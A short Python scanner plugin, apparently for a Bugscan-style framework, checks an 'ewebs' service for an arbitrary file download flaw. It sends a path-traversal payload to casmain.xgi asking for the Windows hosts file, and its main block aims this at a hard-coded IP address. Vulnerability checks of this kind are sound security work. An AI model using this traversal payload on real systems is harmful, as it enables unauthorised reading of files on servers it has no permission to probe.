#!/usr/bin/env python
#-*- coding:utf-8 -*-
#refer:https://www.wooyun.org/bugs/wooyun-2015-0121875


def assign(service, arg):
    if service == 'ewebs':
        return True, arg

def audit(arg):
    payload = "casmain.xgi"
    postdata1="Language_S=../../../../windows/system32/drivers/etc/hosts"
    url = arg + payload
    code, head, body, errcode, _url = curl.curl2(url,postdata1)
    if code == 200 and '127.0.0.1' in body and 'localhost' in body:
        security_warning('Arbitrary file download:'+url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('ewebs', 'http://60.190.163.51:8888/')[1])